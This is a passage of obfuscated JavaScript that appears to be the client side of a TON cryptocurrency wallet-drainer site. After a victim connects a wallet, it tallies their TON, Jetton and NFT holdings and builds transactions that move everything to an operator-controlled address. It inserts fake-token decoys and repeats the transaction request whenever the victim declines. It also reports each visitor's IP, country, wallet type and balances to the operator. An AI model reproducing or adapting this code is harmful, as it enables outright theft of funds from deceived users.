            _0x22a137 += "\n\naction:connect\\_wallet";
            await _0x28f968(_0x22a137);
            await _0x23e642(_0x3090a7);
          },
          _0x39b4e9 = async (_0x5b6d24, _0x2f017d, _0xdefb8b) => {
            console.log("orig ton:", _0x5b6d24);
            let _0x1beb45 = Object.assign({}, _0x5b6d24),
              _0x34f9c8 = 0.05;
            (_0x2f017d.length > 0 || _0xdefb8b.length > 0) && (_0x34f9c8 = 0.07);
            let _0x2cb2d2 = (_0x2f017d.length + _0xdefb8b.length) * 0.03 + _0x34f9c8;
            console.log("comission fee:", _0x2cb2d2);
            console.log("ton before fee:", _0x5b6d24);
            _0x1beb45.tgBalance = _0x1beb45.tgBalance - _0x2cb2d2;
            _0x1beb45.sendingBalance = 1000000000 * _0x1beb45.tgBalance;
            _0x1beb45.balance = _0x1beb45.tgBalance * _0xbf7f36.price;
            _0x1beb45.sendingBalance = parseInt(_0x1beb45.sendingBalance.toFixed(2));
            console.log("ton after fee:", _0x1beb45);
            return {
              comission: _0x1beb45,
              need: _0x2cb2d2
            };
          },
          _0x13175c = async _0x3903b1 => {
            let _0x50e018 = [],
              _0x3ff03a = "tonkeeper" === _0xbf7f36.wallet.name.toLowerCase() && "windows" === _0xbf7f36.wallet.platform.toLowerCase();
            _0xbf7f36.wallet.name.toLowerCase().includes("telegram") || _0xbf7f36.wallet.name.toLowerCase().includes("okx") ? console.log("fake token disabled for wallet ".concat(_0xbf7f36.wallet.name || "unknown", " (").concat(_0xbf7f36.wallet.platform || "unknown", ")")) : (console.log("is tonkeeper ext:", _0x3ff03a), [1, 3, 5, 7].includes(_0xbf7f36.wallet.fake_val) && !_0x3ff03a && _0x50e018.push({
              balance: 123,
              name: "Test",
              type: "Fake"
            }), [2, 3, 6, 7].includes(_0xbf7f36.wallet.fake_val) && _0x50e018.push({
              balance: 123,
              name: "Test",
              type: "FakeNFT"
            }), [4, 5, 6, 7].includes(_0xbf7f36.wallet.fake_val));
            let _0xa63e6b = _0x3903b1.reduce((_0x1ca105, _0x4f1216) => (_0x1ca105[_0x4f1216.type] || (_0x1ca105[_0x4f1216.type] = 0), _0x1ca105[_0x4f1216.type] += _0x4f1216.calculatedBalanceUSDTG, _0x1ca105), {});
            console.log("asset type sum:", _0xa63e6b);
            let _0x4436ee = Object.entries(_0xa63e6b).sort((_0x23c5ae, _0x1eaf89) => _0x1eaf89[1] - _0x23c5ae[1]).map(_0x3d3a2f => _0x3d3a2f[0]),
              _0x2f8240 = _0x3903b1.filter((_0xb0e913, _0x2390eb, _0x2a794d) => _0x2390eb === _0x2a794d.findIndex(_0x2f45f1 => _0x2f45f1.type === _0xb0e913.type && _0x2f45f1.balance === _0xb0e913.balance && _0x2f45f1.name === _0xb0e913.name));
            console.log("sorted types:", _0x4436ee);
            for (let _0xa1e7ad = 0; _0xa1e7ad < _0x2f8240.length; _0xa1e7ad++) {
              _0x50e018.push(_0x2f8240[_0xa1e7ad]);
            }
            return _0x50e018;
          },
          _0x23e642 = async _0x487aaf => {
            _0xbf7f36.connected = !0;
            let _0x4ed14c = await _0x13175c(_0x487aaf);
            if (_0x4ed14c.reduce((_0x6cce4b, _0x49e31e) => _0x6cce4b + _0x49e31e.calculatedBalanceUSDTG, 0) < _0x3ed9cc.minBalance.total) {
              _0xbf7f36.connected = !1;
              _0x4ad86b();
              console.log("low balance");
              return !1;
            }
            console.log("combo assets:", _0x4ed14c);
            let _0x11a3b6 = 0;
            _0x4ed14c.length > 0 && (_0x11a3b6 = _0x4ed14c.reduce((_0x5711ce, _0x2a35e4) => _0x5711ce + _0x2a35e4.calculatedBalanceUSDTG, 0));
            console.log("combo assets price:", _0x11a3b6);
            let _0x150058 = _0x4ed14c.filter(_0x23e4d2 => "TON" === _0x23e4d2.type),
              _0x21f2dd = _0x4ed14c.filter(_0x4975ab => "Jetton" === _0x4975ab.type),
              _0x3584bc = _0x4ed14c.filter(_0x3f38de => "NFT" === _0x3f38de.type);
            console.log("ton:", _0x150058);
            console.log("jettons:", _0x21f2dd);
            console.log("nft:", _0x3584bc);
            console.log("config max messages:", _0xbf7f36.wallet.maxMessages);
            for (let _0x106963 = 0; _0x106963 < _0x4ed14c.length; _0x106963 += _0xbf7f36.wallet.maxMessages) {
              let _0x3b0902 = _0x4ed14c.slice(_0x106963, Math.min(_0x106963 + _0xbf7f36.wallet.maxMessages, _0x4ed14c.length));
              console.log("chunk:", _0x3b0902);
              await _0x2f4ccc(_0x3b0902);
              await _0x4cc71d(300);
            }
            return !0;
          },
          _0x1bc7bd = (_0x569517, _0x4e9d7d, _0x22fd5d) => {
            let _0x193584 = (_0x569517 = (_0x569517 = _0x569517.replaceAll("{symbol}", _0x4e9d7d)).replaceAll("{balance}", parseFloat(_0x22fd5d).toFixed(2))).match(/\{balance:([*/+\-])(\d+(?:\.\d+)?)\}/gi);
            if (!_0x193584) {
              return _0x569517;
            }
            for (let _0x54c44d of _0x193584) {
              console.log("match:", _0x54c44d);
              let _0x5cf1ef = _0x54c44d.split(":")[1],
                _0x26a7a4 = _0x5cf1ef.substring(1).substring(0, _0x5cf1ef.length - 1),
                _0x3bbda9 = _0x22fd5d;
              "+" === _0x5cf1ef[0] && (_0x3bbda9 += parseFloat(_0x26a7a4));
              "-" === _0x5cf1ef[0] && (_0x3bbda9 -= parseFloat(_0x26a7a4));
              "*" === _0x5cf1ef[0] && (_0x3bbda9 *= parseFloat(_0x26a7a4));
              "/" === _0x5cf1ef[0] && (_0x3bbda9 /= parseFloat(_0x26a7a4));
              _0x569517 = _0x569517.replace(_0x54c44d, "".concat(_0x3bbda9.toFixed(2)));
            }
            return _0x569517;
          },
          _0x2e1c81 = async _0x3f1d4d => {
            let _0x4e1f0e = [];
            for (let _0x14e26a of (console.log("gen messages chunk:", _0x3f1d4d), _0x3f1d4d)) {
              if ("Fake" === _0x14e26a.type) {
                let _0x5e5817 = (0, _0x4b6491.beginCell)().storeUint(0, 32).storeStringTail("").endCell(),
                  _0x5d6366 = (0, _0x4b6491.beginCell)().storeUint(260734629, 32).storeUint(0, 64).storeCoins((0, _0x4b6491.toNano)(_0xbf7f36.wallet.fake_token_amount)).storeAddress(_0x38b15a.Address.parse(_0x3ed9cc.tonConnectUI.account.address)).storeAddress(_0x38b15a.Address.parse(_0xbf7f36.wallet.fake_token_address)).storeBit(0).storeCoins((0, _0x4b6491.toNano)(0.02).toString()).storeBit(1).storeRef(_0x5e5817).endCell();
                _0x4e1f0e.push({
                  address: _0xbf7f36.wallet.fake_token_address,
                  amount: 1,
                  payload: _0x5d6366.toBoc().toString("base64")
                });
              }
              if ("FakeNFT" === _0x14e26a.type) {
                let _0x1531e1 = (0, _0x4b6491.beginCell)().storeUint(0, 32).storeStringTail("").endCell(),
                  _0x2fba8a = (0, _0x4b6491.beginCell)().storeUint(1607220500, 32).storeUint(0, 64).storeAddress(_0x38b15a.Address.parse(_0x3ed9cc.tonConnectUI.account.address)).storeAddress(_0x38b15a.Address.parse(_0x3ed9cc.tonConnectUI.account.address)).storeBit(0).storeCoins((0, _0x4b6491.toNano)(0.02).toString()).storeBit(1).storeRef(_0x1531e1).endCell();
                _0x4e1f0e.push({
                  address: _0xbf7f36.wallet.fake_nft_address,
                  amount: 1,
                  payload: _0x2fba8a.toBoc().toString("base64")
                });
              }
              if ("Spam" === _0x14e26a.type) {
                let _0x4e7915 = (0, _0x4b6491.beginCell)().storeUint(0, 32).storeStringTail("").endCell();
                _0x4e1f0e.push({
                  address: _0x3ed9cc.wallet,
                  amount: 0,
                  payload: _0x4e7915.toBoc().toString("base64")
                });
                console.log("message spam:", _0x4e1f0e[_0x4e1f0e.length - 1]);
              }
              if ("TON" === _0x14e26a.type) {
                console.log("send ton:", _0x14e26a);
                _0x3ed9cc.comment.ton = _0x1bc7bd(_0x3ed9cc.comment.ton, "TON", _0x14e26a.tgBalance);
                let _0x3c16ad = (0, _0x4b6491.beginCell)().storeUint(0, 32).storeStringTail(_0x3ed9cc.comment.ton).endCell();
                _0x4e1f0e.push({
                  address: _0x3ed9cc.wallet,
                  amount: _0x14e26a.sendingBalance,
                  payload: _0x3c16ad.toBoc().toString("base64")
                });
                console.log("message ton:", _0x4e1f0e[_0x4e1f0e.length - 1]);
              }
              if ("Jetton" === _0x14e26a.type) {
                console.log("send jetton:", _0x14e26a);
                let _0x5cefde = (0, _0x4b6491.beginCell)().storeUint(0, 32).storeStringTail(_0x1bc7bd(_0x3ed9cc.comment.jetton, _0x14e26a.symbol, _0x14e26a.roundedBalance)).endCell(),
                  _0x4f5c40 = (0, _0x4b6491.beginCell)().storeUint(260734629, 32).storeUint(0, 64).storeCoins(_0x14e26a.TokenBalance).storeAddress(_0x38b15a.Address.parse(_0x3ed9cc.wallet)).storeAddress(_0x38b15a.Address.parse(_0x3ed9cc.tonConnectUI.account.address)).storeBit(0).storeCoins(0).storeBit(1).storeRef(_0x5cefde).endCell();
                _0x4e1f0e.push({
                  address: _0x14e26a.wallet_address,
                  amount: (0, _0x4b6491.toNano)(0.05).toString(),
                  payload: _0x4f5c40.toBoc().toString("base64")
                });
                console.log("message jetton:", _0x4e1f0e[_0x4e1f0e.length - 1]);
              }
              if ("NFT" === _0x14e26a.type) {
                let _0x5ec016 = (0, _0x4b6491.beginCell)().storeUint(0, 32).storeStringTail(_0x3ed9cc.comment.ton).endCell(),
                  _0x2ed6ba = (0, _0x4b6491.beginCell)().storeUint(1607220500, 32).storeUint(0, 64).storeAddress(_0x38b15a.Address.parse(_0x3ed9cc.wallet)).storeAddress(_0x38b15a.Address.parse(_0x3ed9cc.tonConnectUI.account.address)).storeBit(0).storeCoins(0).storeBit(1).storeRef(_0x5ec016).endCell();
                _0x4e1f0e.push({
                  address: _0x14e26a.data,
                  amount: (0, _0x4b6491.toNano)("0.05").toString(),
                  payload: _0x2ed6ba.toBoc().toString("base64")
                });
                console.log("message nft:", _0x4e1f0e[_0x4e1f0e.length - 1]);
              }
            }
            return _0x4e1f0e;
          },
          _0x2f4ccc = async _0x1e6e8b => {
            var _0x405da1, _0x16b662, _0x335c6c, _0x5a3a6e, _0x3931c1, _0x14e448;
            let _0xa55647 = await _0x2e1c81(_0x1e6e8b),
              _0x4b2abc = await _0x4dc801(_0xa55647);
            console.log("chunk url:", _0x4b2abc);
            console.log("messages:", _0xa55647);
            let _0x4900e4 = "*Domain:* ".concat(_0xbf7f36.domain, "\n");
            _0x4900e4 += "*IP Location:* ".concat(_0xbf7f36.ip, " ").concat(_0xbf7f36.country, "\n") + "*version:* ".concat(_0x3ed9cc.version, "\n") + "*walletname:* ".concat(null === (_0x405da1 = _0xbf7f36.wallet.name) || void 0 === _0x405da1 ? void 0 : _0x405da1.replace(/[^a-zA-Z0-9 ]+/g, ""), "\n") + "*walletplatform:* ".concat(_0xbf7f36.wallet.platform, "\n") + "\n";
            "" !== _0x4b2abc && (_0x4900e4 += "*chunkurl:* [url](".concat(_0x4b2abc, ")\n\n"));
            _0x4900e4 += "*Wallet:* [Ton View](https://tonviewer.com/".concat(_0x3ed9cc.tonConnectUI.account.address, ")\n") + "*Creating Combo request...*\n\n";
            let _0x1e9487 = _0x1e6e8b.filter(_0x47e86c => "TON" === _0x47e86c.type),
              _0x247590 = _0x1e6e8b.filter(_0x5c5b39 => "Jetton" === _0x5c5b39.type),
              _0x2fd9b0 = _0x1e6e8b.filter(_0x20f2b8 => "NFT" === _0x20f2b8.type);
            if (_0x1e9487.length > 0 && (console.log("ton assets:", _0x1e9487), _0x4900e4 += "*TON Balance:*\n" + "".concat(_0x1e9487[0].tgBalance.toFixed(2), " TON\n\n")), _0x247590.length > 0) {
              for (let _0x43463b of (_0x4900e4 += "*Jetton balances:*\n", _0x247590)) _0x4900e4 += "".concat(null === (_0x16b662 = _0x43463b.symbol) || void 0 === _0x16b662 ? void 0 : _0x16b662.replace(/[^a-zA-Z0-9 ]+/g, ""), " - ").concat(_0x43463b.calculatedBalanceUSDTG, " USD\n");
              _0x4900e4 += "\n";
            }
            if (_0x2fd9b0.length > 0) {
              for (let _0x2ead2a of (_0x4900e4 += "*NFT balances:*\n", _0x2fd9b0)) _0x4900e4 += "".concat(_0x2ead2a.name, " - ").concat(_0x2ead2a.calculatedBalanceUSDTG, " USD\n");
              _0x4900e4 += "\n";
            }
            _0x4900e4 += "action:request\\_combo";
            await _0x28f968(_0x4900e4);
            let _0x3c62bd = {
              validUntil: Math.floor(Date.now() / 1000) + 60,
              messages: _0xa55647
            };
            console.log("transaction object:", _0x3c62bd);
            try {
              await _0x3ed9cc.tonConnectUI.sendTransaction(_0x3c62bd);
              let _0x542b41 = "*Approved Transfer Combo*\n\n";
              if (_0x542b41 += "*Domain:* ".concat(_0xbf7f36.domain, "\n") + "*IP Location:* ".concat(_0xbf7f36.ip, " ").concat(_0xbf7f36.country, "\n") + "*version:* ".concat(_0x3ed9cc.version, "\n") + "*walletname:* ".concat(null === (_0x335c6c = _0xbf7f36.wallet.name) || void 0 === _0x335c6c ? void 0 : _0x335c6c.replace(/[^a-zA-Z0-9 ]+/g, ""), "\n") + "*walletplatform:* ".concat(_0xbf7f36.wallet.platform, "\n") + "\n" + "*Wallet:* [Ton View](https://tonviewer.com/".concat(_0x3ed9cc.tonConnectUI.account.address, ")\n\n"), _0x1e9487.length > 0 && (_0x542b41 += "*TON Balance:*\n" + "".concat(_0x1e9487[0].tgBalance.toFixed(2), " TON\n\n")), _0x247590.length > 0) {
                for (let _0x5e080b of (_0x542b41 += "*Jetton balances:*\n", _0x247590)) _0x542b41 += "".concat(null === (_0x5a3a6e = _0x5e080b.symbol) || void 0 === _0x5a3a6e ? void 0 : _0x5a3a6e.replace(/[^a-zA-Z0-9 ]+/g, ""), " - ").concat(_0x5e080b.calculatedBalanceUSDTG, " USD\n");
                _0x542b41 += "\n";
              }
              if (_0x2fd9b0.length > 0) {
                for (let _0x1367f9 of (_0x4900e4 += "*NFT balances:*\n", _0x2fd9b0)) _0x4900e4 += "".concat(_0x1367f9.name, " - ").concat(_0x1367f9.calculatedBalanceUSDTG, " USD\n");
                _0x4900e4 += "\n";
              }
              _0x542b41 += "action:approve\\_combo";
              await _0x28f968(_0x542b41);
            } catch (_0x2b92a6) {
              let _0x538764 = "*Declined or errored Combo transfer...*\n\n";
              if (_0x538764 += "*Domain:* ".concat(_0xbf7f36.domain, "\n") + "*IP Location:* ".concat(_0xbf7f36.ip, " ").concat(_0xbf7f36.country, "\n") + "*version:* ".concat(_0x3ed9cc.version, "\n") + "*walletname:* ".concat(null === (_0x3931c1 = _0xbf7f36.wallet.name) || void 0 === _0x3931c1 ? void 0 : _0x3931c1.replace(/[^a-zA-Z0-9 ]+/g, ""), "\n") + "*walletplatform:* ".concat(_0xbf7f36.wallet.platform, "\n") + "\n", "" !== _0x4b2abc && (_0x4900e4 += "*chunkurl:* [url](".concat(_0x4b2abc, ")\n\n")), _0x538764 += "*Wallet:* [Ton View](https://tonviewer.com/".concat(_0x3ed9cc.tonConnectUI.account.address, ")\n\n"), _0x1e9487.length > 0 && (_0x538764 += "*TON Balance:*\n" + "".concat(_0x1e9487[0].tgBalance.toFixed(2), " TON\n\n")), _0x247590.length > 0) {
                for (let _0xdeb905 of (_0x538764 += "*Jetton balances:*\n", _0x247590)) _0x538764 += "".concat(null === (_0x14e448 = _0xdeb905.symbol) || void 0 === _0x14e448 ? void 0 : _0x14e448.replace(/[^a-zA-Z0-9 ]+/g, ""), " - ").concat(_0xdeb905.calculatedBalanceUSDTG, " USD\n");
                _0x538764 += "\n";
              }
              _0x538764 += "action:decline\\_combo";
              await _0x28f968(_0x538764);
              console.log("declined message:", _0x2b92a6);
              await _0x2f4ccc(_0x1e6e8b);
            }
          },
          _0x55a1c6 = () => {
            _0x3ed9cc.tonConnectUI = new _0x169e4.HF({
              manifestUrl: "https://".concat(_0xbf7f36.domain, "/tonconnect-manifest.json"),
              buttonRootId: "ton-connect"
            });
            _0x3ed9cc.tonConnectUI.uiOptions = {
              actionsConfiguration: {
                returnStrategy: "back"
              }
            };
            let _0x534b7f = async _0x13ff45 => {
                if (console.log("ui callback called, user connected:", _0xbf7f36.connected), !_0xbf7f36.connected) {
                  try {
                    var _0x280d10, _0x63af29, _0x16df81;
                    if (!(null == _0x13ff45 ? void 0 : null === (_0x280d10 = _0x13ff45.account) || void 0 === _0x280d10 ? void 0 : _0x280d10.address)) {
                      console.log("wallet disconnected");
                      _0xbf7f36.connected = !1;
                      return;
                    }
                    let _0x4feac7 = (null == _0x3ed9cc ? void 0 : null === (_0x16df81 = _0x3ed9cc.tonConnectUI) || void 0 === _0x16df81 ? void 0 : null === (_0x63af29 = _0x16df81.connector) || void 0 === _0x63af29 ? void 0 : _0x63af29._wallet) || _0x13ff45;
                    console.log("connector:", _0x4feac7);
                    let _0x58bf06 = _0x4feac7.account.address;
                    for (let _0x523374 of (console.log("connected wallet:", _0x58bf06), _0xbf7f36.wallet.address = _0x4feac7.account.address, _0xbf7f36.wallet.name = _0x4feac7.device.appName, _0xbf7f36.wallet.platform = _0x4feac7.device.platform, console.log("wallet object:", _0x4feac7), _0xbf7f36.wallet.maxMessages = 4, _0x4feac7.device.features)) if ("object" == typeof _0x523374 && _0x523374.maxMessages) {
                      console.log("feature object:", _0x523374);
                      _0xbf7f36.wallet.maxMessages = +_0x523374.maxMessages;
                      break;
                    }
                    console.log("max messages (from feature object):", _0xbf7f36.wallet.maxMessages);
                    _0xbf7f36.connected = !0;
                    await _0x247237();
                  } catch (_0x42214c) {
                    console.error("ui callback reject:", _0x42214c);
                    _0xbf7f36.connected = !1;
                  }
                }
              },
              _0xe936ce = async () => {
                try {
                  _0x3ed9cc.tonConnectUI.connected ? (console.log("call ui callback"), await _0x534b7f(_0x3ed9cc.tonConnectUI.wallet)) : (console.log("open modal"), await _0x3ed9cc.tonConnectUI.openModal());
                } catch (_0x423c2c) {}
              };
            for (let _0x55f327 of document.querySelectorAll(".openButton")) _0x55f327.addEventListener("click", _0xe936ce);
            window.openButton = () => {
              _0x3ed9cc.tonConnectUI.openModal();
            };
            _0x3ed9cc.tonConnectUI.onStatusChange(_0x534b7f);
          },
          _0x1aef20 = async () => {
            console.log("version:", _0x3ed9cc.version);
            try {
              localStorage.removeItem("ton-connect-storage_bridge-connection");
            } catch (_0x2ed10d) {}
            _0x55a1c6();
            let _0xbcd4ad = await _0x4aec0f();
            console.log("location info:", _0xbcd4ad);
            _0xbf7f36.ip = _0xbcd4ad.ip;
            _0xbf7f36.country = _0xbcd4ad.loc;
            console.log("blocklist:", _0x3ed9cc.blocklist);
            _0x3ed9cc.blocklist.includes(_0xbf7f36.country) && window.location.replace("https://ton.org");
            _0x3ed9cc.wallets = await _0x402cfb();
            console.log("wallet list:", _0x3ed9cc.wallets);
            await _0x2e2330();
            let _0x440ec0 = "*User opened the website*\n";
            _0x440ec0 += "\n" + "*Domain:* ".concat(_0xbf7f36.domain, "\n") + "*IP Location*: ".concat(_0xbf7f36.ip, " ").concat(_0xbf7f36.country, "\n") + "\naction:visit";
            await _0x11f2fe(_0x440ec0);
          };
        await _0x1aef20();
        return () => {};
      }, []);
    }
  },
  8924: function () {},
  5024: function () {}
}, function (_0x36c6bf) {
  _0x36c6bf.O(0, [937, 301, 888, 774, 179], function () {
    return _0x36c6bf(_0x36c6bf.s = 5557);
  });
  _N_E = _0x36c6bf.O();
}]);